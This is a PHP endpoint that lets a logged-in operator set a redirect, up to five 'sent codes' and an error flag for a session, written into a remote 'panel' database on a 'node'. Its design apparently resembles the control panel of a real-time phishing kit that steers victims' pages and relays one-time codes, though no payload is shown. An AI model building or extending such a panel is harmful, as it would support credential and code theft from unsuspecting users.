<?php

include "cors.php";
require "lib/ErrorHandler.php";
require_once 'lib/DB.php';

use Library\DB as DB;

session_start();

$userpassword = $_SESSION['userSessionPass'];
$userID = $_SESSION['userID'];
$sessionID = $_POST['sessionId'];
//frontend will have this saved or go thru panel list,making requests
$nodeID = $_POST['nodeId'];
$panelID = $_POST['panelId'];
$newRedirect = $_POST['newRedirect'];

$sentcode1 = NULL;
$sentcode2 = NULL;
$sentcode3 =  NULL;
$sentcode4 =  NULL;
$sentcode5 =  NULL;
$setError = false;

if(!$userID || !$userpassword){
    ErrorHandler::authError();
}

if((!$nodeID || !$panelID) && $sessionID!="testsession"){
    ErrorHandler::serverError();
}

if(!$sessionID){
    ErrorHandler::serverError();
}

if(isset($_POST['sentcode1'])){
    $sentcode1=$_POST['sentcode1'];
}

if(isset($_POST['sentcode2'])){
    $sentcode2=$_POST['sentcode2'];
}

if(isset($_POST['sentcode3'])){
    $sentcode3=$_POST['sentcode3'];
}

if(isset($_POST['sentcode4'])){
    $sentcode4=$_POST['sentcode4'];
}

if(isset($_POST['sentcode5'])){
    $sentcode5=$_POST['sentcode5'];
}

if(isset($_POST['seterror'])){
    $setError = $_POST['seterror'];
}

// Connect to the database
$conn = DB::connect();

// Check connection
if (!$conn) {
    error_log("Connection failed: " . mysqli_connect_error());
    ErrorHandler::serverError();
}

$user = DB::getUser($conn, $userID);
$user=DB::getUser($conn,$_SESSION['userID']);
if(!$user){
    error_log("Error loading user data: " . mysqli_error($conn));
    ErrorHandler::authError();
}

$user=$user[0];

if($sessionID=="testsession"){
    $updated=DB::sendTestData($conn,$user,$newRedirect,$sentcode1,$sentcode2,$sentcode3,$sentcode4,$sentcode5,$setError);
    if($updated){
        echo json_encode(array(
            "status"=>"ok",
        ));
    }
    else{
        error_log("Error sending data : " . mysqli_error($conn));
        ErrorHandler::serverError();
    }
    return;
}

$panel = DB::getPanel($conn,$user,$panelID,$nodeID);
if($panel==null){
    $panel = DB::getPanelAddedToById($conn,$user,$panelID);
}
if($panel==null){
    ErrorHandler::serverError();
}
if($panel){
    $panel=$panel[0];
    if(isset($panel['nodeID'])){
        $panel["nodeId"] = $panel["nodeID"];
    }
}

$node = DB::getNodeById($conn,$panel["nodeId"]);
if(!$node){
    ErrorHandler::serverError();
}
$node = $node[0];
$nodeHost = $node['ip'] ? $node['ip'] : $node['nodeId'];
$sql_user = $node['sql_user'];
$nodeSQLUser =  $sql_user ? $sql_user : $node['NodeName'];
$nodeSQLPass = $node['sql_key'];
$panelDB = $panel['panelId'];
$NodeConn = new mysqli($nodeHost, $nodeSQLUser, $nodeSQLPass, $panelDB);

if(!$NodeConn){
    ErrorHandler::serverError();
}

$updated=DB::sendData($NodeConn,$sessionID,$newRedirect,$sentcode1,$sentcode2,$sentcode3,$sentcode4,$sentcode5,$setError);
if($updated){
    echo json_encode(array(
        "status"=>"ok",
    ));
}
else{
    error_log("Error updating redirect : " . mysqli_error($NodeConn));
    ErrorHandler::serverError();
}
?>